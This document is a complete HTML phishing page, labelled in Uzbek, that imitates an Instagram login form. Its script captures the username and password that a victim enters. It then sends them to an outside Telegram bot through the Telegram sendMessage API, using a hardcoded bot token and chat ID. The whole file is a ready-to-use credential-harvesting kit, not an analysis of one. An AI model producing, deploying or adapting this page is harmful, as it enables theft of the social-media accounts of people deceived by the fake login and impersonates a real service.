<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h2 {
            text-align: center;
        }

        input[type="text"],
        input[type="password"],
        button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            background-color: #3897f0;
            color: #fff;
            cursor: pointer;
        }

        button:hover {
            background-color: #357ae8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Instagramga kirish</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Foydalanuvchi nomi">
            <input type="password" id="password" placeholder="Parol">
            <button type="submit">Kirish</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event){
            event.preventDefault();
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            // Bu erda kirish ma'lumotlarini Instagramga jo'natish uchun kerakli kodlar yoziladi
            console.log("Foydalanuvchi nomi: " + username + ", Parol: " + password);

            // Foydalanuvchi kirish ma'lumotlarini yuborish funksiyasini chaqirish
            sendToTelegram(username, password);
        });

        function sendToTelegram(username, password) {
            // Telegram botga yuborilishi kerak bo'lgan ma'lumotlar
            var telegramBotToken = '5158957466:AAHCTKMlioXYMcCTkq_wGmOQI_Hv6BkEbK4'; // Telegram botning to'g'ri tokenini qo'yish kerak
            var chatId = '6257833207'; // Telegram botning chat ID raqamini qo'yish kerak

            // Telegramga yuboriladigan xabar
            var message = "Foydalanuvchi nomi: " + username + "\nParol: " + password;

            // Telegram botga yuborish uchun HTTP so'rov tuzish
            var url = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
            var params = {
                chat_id: chatId,
                text: message
            };

            // Xabar yuborish uchun POST so'rovi tuzish
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/json");

            // Ma'lumotlarni JSON formatiga o'zgartirish
            var jsonData = JSON.stringify(params);

            // Xabarni yuborish
            xhr.send(jsonData);
        }
    </script>
</body>
</html>
